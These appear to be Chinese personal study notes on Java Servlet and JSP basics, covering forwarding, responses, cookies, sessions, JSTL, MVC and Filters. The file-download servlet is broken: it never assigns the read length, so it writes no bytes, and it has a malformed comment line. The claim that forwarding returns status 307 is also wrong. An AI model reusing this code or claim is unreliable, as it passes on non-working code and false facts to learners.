<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    resp.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">    resp.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">    ServletContext context=<span class="keyword">this</span>.getServletContext();</span><br><span class="line">    String url = context.getInitParameter(<span class="string">&quot;url&quot;</span>);</span><br><span class="line">    resp.getWriter().print(url)        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>请求对应页面会打印出jdbc:mysql//localhost:3306/mybatis</p>
<h5 id="请求转发"><a href="#请求转发" class="headerlink" title="请求转发"></a>请求转发</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">dispatcher</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        ServletContext context= <span class="keyword">this</span>.getServletContext();</span><br><span class="line">        context.getRequestDispatcher(<span class="string">&quot;/hello&quot;</span>).forward(req,resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>请求sd就等于请求了/hello,并且浏览器状态码为200,不是3**的重定向</p>
<p>我觉得对于安全性来说很好,A请求B,B可以去请求C的内容,虽然A得到了C的内容,但是A永远只和B交流</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220113222128264.png" alt="image-20220113222128264"></p>
<h5 id="读取资源-配置-文件"><a href="#读取资源-配置-文件" class="headerlink" title="读取资源(配置)文件"></a>读取资源(配置)文件</h5><p>Properties</p>
<ul>
<li>在java目录下新建properties</li>
<li>在resources目录下新建properties</li>
</ul>
<p>发现:都被打包到了同一个路径下:classes,俗称这个路径为classpath</p>
<p>需要一个文件流</p>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="HttpServletResponse"><a href="#HttpServletResponse" class="headerlink" title="HttpServletResponse"></a>HttpServletResponse</h3><p>web服务器接收到客户端的http请求,针对这个请求,分别创建一个代表请求的HttpServletRequest对象,代表响应的一个HttpServletResponse对象</p>
<p>获取客户端请求过来的参数,找HttpServletRequest</p>
<p>如果要给客户端响应信息,找HttpServletResponse</p>
<h4 id="响应状态码"><a href="#响应状态码" class="headerlink" title="响应状态码"></a>响应状态码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> SC_CONTINUE = <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_SWITCHING_PROTOCOLS = <span class="number">101</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_OK = <span class="number">200</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_CREATED = <span class="number">201</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_ACCEPTED = <span class="number">202</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_NON_AUTHORITATIVE_INFORMATION = <span class="number">203</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_NO_CONTENT = <span class="number">204</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_RESET_CONTENT = <span class="number">205</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_PARTIAL_CONTENT = <span class="number">206</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_MULTIPLE_CHOICES = <span class="number">300</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_MOVED_PERMANENTLY = <span class="number">301</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_MOVED_TEMPORARILY = <span class="number">302</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_FOUND = <span class="number">302</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_SEE_OTHER = <span class="number">303</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_NOT_MODIFIED = <span class="number">304</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_USE_PROXY = <span class="number">305</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_TEMPORARY_REDIRECT = <span class="number">307</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_BAD_REQUEST = <span class="number">400</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_UNAUTHORIZED = <span class="number">401</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_PAYMENT_REQUIRED = <span class="number">402</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_FORBIDDEN = <span class="number">403</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_NOT_FOUND = <span class="number">404</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_METHOD_NOT_ALLOWED = <span class="number">405</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_NOT_ACCEPTABLE = <span class="number">406</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_PROXY_AUTHENTICATION_REQUIRED = <span class="number">407</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_REQUEST_TIMEOUT = <span class="number">408</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_CONFLICT = <span class="number">409</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_GONE = <span class="number">410</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_LENGTH_REQUIRED = <span class="number">411</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_PRECONDITION_FAILED = <span class="number">412</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_REQUEST_ENTITY_TOO_LARGE = <span class="number">413</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_REQUEST_URI_TOO_LONG = <span class="number">414</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_UNSUPPORTED_MEDIA_TYPE = <span class="number">415</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_REQUESTED_RANGE_NOT_SATISFIABLE = <span class="number">416</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_EXPECTATION_FAILED = <span class="number">417</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_INTERNAL_SERVER_ERROR = <span class="number">500</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_NOT_IMPLEMENTED = <span class="number">501</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_BAD_GATEWAY = <span class="number">502</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_SERVICE_UNAVAILABLE = <span class="number">503</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_GATEWAY_TIMEOUT = <span class="number">504</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_HTTP_VERSION_NOT_SUPPORTED = <span class="number">505</span>;</span><br></pre></td></tr></table></figure>

<h4 id="常见应用"><a href="#常见应用" class="headerlink" title="常见应用"></a>常见应用</h4><h5 id="1-向浏览器输出消息"><a href="#1-向浏览器输出消息" class="headerlink" title="1.向浏览器输出消息"></a>1.向浏览器输出消息</h5><p>getWriter(),getOutputStream()</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220113224928187.png" alt="image-20220113224928187"></p>
<h5 id="2-下载文件"><a href="#2-下载文件" class="headerlink" title="2.下载文件"></a>2.下载文件</h5><ol>
<li>要获取下载文件路径</li>
<li>下载文件名是啥</li>
<li>设置想办法让浏览器能够支持下载我们需要的东西</li>
<li>获取下载文件的输入流</li>
<li>创建缓冲区</li>
<li>获取OutputStream对象</li>
<li>将FileOutputStream流写入到buffer缓冲区</li>
<li>使用OutputStream将缓冲区中的数据输出到客户端</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.blue.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletOutputStream;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">down</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        String realPath=<span class="string">&quot;F:\\Project\\maven\\maven_web_1\\src\\main\\resources\\img.png&quot;</span>;</span><br><span class="line">        <span class="comment">//2.获取下载文件名</span></span><br><span class="line">        String filename=realPath.substring(realPath.lastIndexOf(<span class="string">&quot;\\&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//3.设置头</span></span><br><span class="line">        /中文文件名的话还要设置编码</span><br><span class="line">        resp.setHeader(<span class="string">&quot;Content-Disposition&quot;</span>,<span class="string">&quot;attachment;filename=&quot;</span>+filename);</span><br><span class="line">        <span class="comment">//4.获取下载文件的输入流</span></span><br><span class="line">        FileInputStream in=<span class="keyword">new</span> FileInputStream(realPath);</span><br><span class="line">        <span class="comment">//5.创建缓冲区</span></span><br><span class="line">        <span class="keyword">int</span> len=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] buffer=<span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="comment">//6.获取OutputStream对象</span></span><br><span class="line">        ServletOutputStream out=resp.getOutputStream();</span><br><span class="line">        <span class="comment">//7.将fileOutputStream流写入到buffer缓冲区,使用OutputStream将缓冲区中的数据输出到客户端</span></span><br><span class="line">        <span class="keyword">while</span> (in.read(buffer)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            out.write(buffer,<span class="number">0</span>,len);</span><br><span class="line">        &#125;</span><br><span class="line">        in.close();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="实现网页重定向"><a href="#实现网页重定向" class="headerlink" title="实现网页重定向"></a>实现网页重定向</h4><p>不同于servlet的资源请求重定向,response是通过浏览器实现的重定向</p>
<p><code>resp.sendRedirect(&quot;路径&quot;);</code></p>
<p><code>&amp;&#123;pageContext.request.contextPath&#125;</code>代表当前项目路径</p>
<p>重定向和转发的区别:</p>
<p>编码:转发307,重定向302</p>
<p>相同点:页面都会跳转</p>
<p>不同点:url变与不变</p>
<h3 id="HttpServletRequest"><a href="#HttpServletRequest" class="headerlink" title="HttpServletRequest"></a>HttpServletRequest</h3><p>通过HttpServletRequest获取客户端的信息</p>
<p>获取前端提交的参数</p>
<p><code>req.getParameter(&quot;username&quot;);</code></p>
<p><code>getParamaterValues();</code>返回一个字符数组</p>
<h4 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h4><ul>
<li>一个Cookie只能保存一个信息</li>
<li>一个web站点可以给浏览器发送多个cookie,最多存放20个cookie</li>
<li>cookie大小有限制4kb</li>
<li>300个cookie浏览器上限</li>
</ul>
<p>删除Cookie</p>
<ul>
<li>不设置有效期,关闭浏览器,自动失效</li>
<li>设置有效期为0</li>
</ul>
<p>传递中文记得使用URLEncoder.encode(“中文”,”utf-8”);</p>
<h4 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h4><ul>
<li>服务器会给每一个用户(浏览器)创建一个Session对象</li>
<li>一个Session独占一个浏览器,只要浏览器没有关闭,这个Session就存在</li>
<li>用户登录之后,整个网站它都可以访问</li>
</ul>
<h3 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h3><p>JAVA Server Pages</p>
<p>最大特点:</p>
<ul>
<li>写JSP就像在写HTML</li>
<li>区别:<ul>
<li>HTML静态数据</li>
<li>JSP页面可以嵌入JAVA代码,为用户提供动态数据</li>
</ul>
</li>
</ul>
<p>JSP本质上就是Servlet</p>
<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220114211237653.png" alt="image-20220114211237653"  />

<h5 id="jsp与对应jsp-java转换关系"><a href="#jsp与对应jsp-java转换关系" class="headerlink" title="jsp与对应jsp.java转换关系"></a>jsp与对应jsp.java转换关系</h5><p>只要是java代码就原封不动的输出</p>
<p>如果是HTML代码,就会被转换为:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">out.write(&quot;&lt;xxxxxxx&gt;&quot;)</span><br></pre></td></tr></table></figure>



<h4 id="JSP基础语法"><a href="#JSP基础语法" class="headerlink" title="JSP基础语法"></a>JSP基础语法</h4><p>开始前要先导入依赖,<a href="https://mvnrepository.com/">maven依赖在线查询</a></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--Servlet依赖--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/javax.servlet.jsp/javax.servlet.jsp-api --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--JSP依赖--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet.jsp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet.jsp-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--JSTL表达式的依赖--&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.glassfish.web<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jakarta.servlet.jsp.jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--standard标签库--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/taglibs/standard --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>taglibs<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>standard<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><h5 id="表达式"><a href="#表达式" class="headerlink" title="表达式"></a>表达式</h5><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%=变量或者表达式%&gt;</span><br><span class="line">&lt;%=<span class="keyword">new</span> java.util.Date()%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以用${变量名}(EL表达式)代替,更高级,并且会将一些错误默认不显示,比如不存在的变量</p>
<h5 id="脚本片段"><a href="#脚本片段" class="headerlink" title="脚本片段"></a>脚本片段</h5><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">	java脚本片段</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<h5 id="JSP声明"><a href="#JSP声明" class="headerlink" title="JSP声明"></a>JSP声明</h5><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> globalVar = <span class="number">0</span>;    </span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>会被编译到jsp生成的java类中,其他的会被生成到对应的java文件中的jspService方法中</p>
<h5 id="在代码中嵌入HTML元素"><a href="#在代码中嵌入HTML元素" class="headerlink" title="在代码中嵌入HTML元素"></a>在代码中嵌入HTML元素</h5><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%<span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">    %&gt;</span><br><span class="line">    &lt;h1&gt;hello,world &lt;%=i%&gt; &lt;/h1&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220115211903441.png" alt="image-20220115211903441" style="zoom:80%;" />

<h3 id="JSP指令"><a href="#JSP指令" class="headerlink" title="JSP指令"></a>JSP指令</h3><h5 id="配置错误页面-lt-page-args…-gt"><a href="#配置错误页面-lt-page-args…-gt" class="headerlink" title="配置错误页面&lt;%@page  args…%&gt;"></a>配置错误页面&lt;%@page  args…%&gt;</h5><h5 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h5><p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220115215532167.png" alt="image-20220115215532167"></p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> errorPage=<span class="string">&quot;error/500.jsp&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>

<h5 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h5><p>修改web.xml</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220115215913478.png" alt="image-20220115215913478"></p>
<h5 id="lt-include-file-””-gt"><a href="#lt-include-file-””-gt" class="headerlink" title="&lt;%@include file=””%&gt;"></a>&lt;%@include file=””%&gt;</h5><h4 id="九大内置对象"><a href="#九大内置对象" class="headerlink" title="九大内置对象"></a>九大内置对象</h4><ul>
<li>pageContext     存东西    还可以forward()转发请求</li>
<li>request    存东西</li>
<li>Response</li>
<li>Session    存东西</li>
<li>Application      (ServletContext)存东西</li>
<li>config            (ServletConfig)</li>
<li>out</li>
<li>page    用来导包</li>
<li>exception</li>
</ul>
<p>对象设置的值的作用域和时间比较</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    pageContext.setAttribute(<span class="string">&quot;name1&quot;</span>,<span class="string">&quot;名字1&quot;</span>);<span class="comment">//保存的数据只在一个页面中有效(它有个scope参数,可以修改作用域)</span></span><br><span class="line">    request.setAttribute(<span class="string">&quot;name1&quot;</span>,<span class="string">&quot;名字2&quot;</span>);<span class="comment">//保存的数据只在一次请求中有效,请求转发会携带这个数据</span></span><br><span class="line">    session.setAttribute(<span class="string">&quot;name1&quot;</span>,<span class="string">&quot;名字3&quot;</span>);<span class="comment">//保存的数据只在一次会话中有效,从打开浏览器到关闭浏览器</span></span><br><span class="line">    application.setAttribute(<span class="string">&quot;name1&quot;</span>,<span class="string">&quot;名字4&quot;</span>);<span class="comment">//保存的数据只在服务器中有效,从打开服务器到关闭服务器</span></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>一些应用场景</p>
<p>request:客户端向服务器发送请求,产生的数据,用户看完就没用了,比如,新闻</p>
<p>session:客户端向服务器发送请求,产生的数据,用户看完还有用</p>
<p>application:客户端向服务器发送请求,产生的数据,一个用户用完了,其他用户还可能用,比如:聊天数据</p>
<h3 id="JSP标签-JSTL标签-EL表达式"><a href="#JSP标签-JSTL标签-EL表达式" class="headerlink" title="JSP标签,JSTL标签,EL表达式"></a>JSP标签,JSTL标签,EL表达式</h3><p>需要导入两个包</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.glassfish.web<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jakarta.servlet.jsp.jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--standard标签库--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/taglibs/standard --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>taglibs<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>standard<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="EL表达式"><a href="#EL表达式" class="headerlink" title="EL表达式"></a>EL表达式</h4><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page  isELIgnored=<span class="string">&quot;false&quot;</span>%&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>获取数据</li>
<li>执行运算</li>
<li>获取web开发的常用对象</li>
</ul>
<p>比如获取表单中的数据${param.参数名}</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220116002754237.png" alt="image-20220116002754237"></p>
<ul>
<li><del>调用java方法</del></li>
</ul>
<h4 id="JSP标签"><a href="#JSP标签" class="headerlink" title="JSP标签"></a>JSP标签</h4><p>可以通过标签转发请求并携带参数</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%--&lt;jsp:include page=<span class="string">&quot;page1.jsp&quot;</span>&gt;&lt;/jsp:include&gt;--%&gt;</span><br><span class="line">&lt;jsp:forward page=<span class="string">&quot;page1.jsp&quot;</span>&gt;</span><br><span class="line">    &lt;jsp:param name=<span class="string">&quot;user&quot;</span> value=<span class="string">&quot;wuhu&quot;</span>/&gt;</span><br><span class="line">    &lt;jsp:param name=<span class="string">&quot;pwd&quot;</span> value=<span class="string">&quot;***&quot;</span>/&gt;</span><br><span class="line">&lt;/jsp:forward&gt;</span><br></pre></td></tr></table></figure>

<h4 id="JSTL表达式"><a href="#JSTL表达式" class="headerlink" title="JSTL表达式"></a>JSTL表达式</h4><p><label style="background:yellow">JSTL标签库的使用就是为了弥补HTML标签的不足</label></p>
<p>东西太多了,边用边查就行,使用前记得导包</p>
<h5 id="核心标签-重点掌握一下"><a href="#核心标签-重点掌握一下" class="headerlink" title="核心标签(重点掌握一下)"></a>核心标签(重点掌握一下)</h5><p>要先在jsp页面中引入JSTL核心标签库</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%<span class="meta">@taglib</span> prefix=<span class="string">&quot;c&quot;</span> uri=<span class="string">&quot;http://java.sun.com/jsp/jstl/core&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>

<h5 id="JSTL标签库使用步骤"><a href="#JSTL标签库使用步骤" class="headerlink" title="JSTL标签库使用步骤"></a>JSTL标签库使用步骤</h5><ul>
<li>引入对应的taglib</li>
<li>使用其中的方法</li>
<li>在Tomcat  lib中也需要引入JSTL的包,否则会报JSTL解析错误(其他包的解析错误也可用同样的方法手动导入到lib目录)</li>
</ul>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    ArrayList&lt;String&gt; students =<span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    students.add(<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">    students.add(<span class="string">&quot;李四&quot;</span>);</span><br><span class="line">    students.add(<span class="string">&quot;王五&quot;</span>);</span><br><span class="line">    students.add(<span class="string">&quot;赵六&quot;</span>);</span><br><span class="line">    request.setAttribute(<span class="string">&quot;list&quot;</span>,students);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;c:forEach <span class="keyword">var</span>=<span class="string">&quot;student&quot;</span> items=<span class="string">&quot;$&#123;list&#125;&quot;</span>&gt;</span><br><span class="line">    &lt;c:out value=<span class="string">&quot;$&#123;student&#125;&quot;</span>/&gt;&lt;br&gt;</span><br><span class="line"></span><br><span class="line">&lt;/c:forEach&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220116130300211.png" alt="image-20220116130300211"></p>
<p>在使用jstl的过程中出现了诸多问题,对于notFoundclass这一类的问题的同意解决办法就是手动导入jstl1.2和standard1.1.2包到WEB-INF目录下的lib目录和tomcat的lib目录下,切记,不能2.0的包和1.2的包混着用</p>
<p>对于使用maven阿里云镜像无法导入jstl1.2我表示真坑</p>
<h4 id="javaBean"><a href="#javaBean" class="headerlink" title="javaBean"></a>javaBean</h4><p>实体类</p>
<p>javaBean有特定的写法</p>
<ul>
<li>必须要有一个无参构造</li>
<li>属性必须私有化</li>
<li>必须有对应的get/set方法</li>
</ul>
<p>一般用来和数据库的字段做映射 ORM:</p>
<h5 id="ORM-对象关系映射"><a href="#ORM-对象关系映射" class="headerlink" title="ORM: 对象关系映射"></a>ORM: 对象关系映射</h5><ul>
<li>表—-&gt;类</li>
<li>字段—–&gt;属性</li>
<li>行记录—–&gt;对象</li>
</ul>
<h3 id="MVC三层架构"><a href="#MVC三层架构" class="headerlink" title="MVC三层架构"></a>MVC三层架构</h3><p>Model  View  Controller 模型,视图,控制器</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220116213212850.png" alt="image-20220116213212850"></p>
<p>Model</p>
<ul>
<li>业务处理:业务逻辑(service)</li>
<li>数据持久层: CRUD (Dao)</li>
</ul>
<p>View</p>
<ul>
<li>展示数据</li>
<li>提供链接发起Servlet请求</li>
</ul>
<p>Controller</p>
<ul>
<li>接收用户的请求(req:请求参数,Session信息…)</li>
<li>交给业务层处理对应的代码</li>
<li>控制视图的跳转</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">登录---&gt;接收用户的登录请求---&gt;处理用户的请求(获取用户登录的参数)---&gt;交给业务层处理登录业务(判断用户名密码是否正确)---&gt;Dao层查询用户名和密码是否正确</span><br></pre></td></tr></table></figure>

<h3 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h3><p>Filter过滤器,用来过滤网站的数据:</p>
<p>web服务有一些垃圾请求,后台不应该处理,或者应该直接报错</p>
<ul>
<li>处理中文乱码</li>
<li>登录验证……</li>
</ul>
<p>Filter开发步骤</p>
<p>1.导包</p>
<p>2.编写过滤器</p>
<ul>
<li>导包别错,是servlet下面的filter</li>
<li>配置好web.xml,并且注意要过滤的路径</li>
</ul>
<p>例子</p>
<p>web.xml中配置的内容,和servlet配置很像,<code>&lt;url-pattern&gt;/*&lt;/url-pattern&gt;</code>表示要过滤的部分,和servlet的urlpattern相对应,属于包含关系了</p>
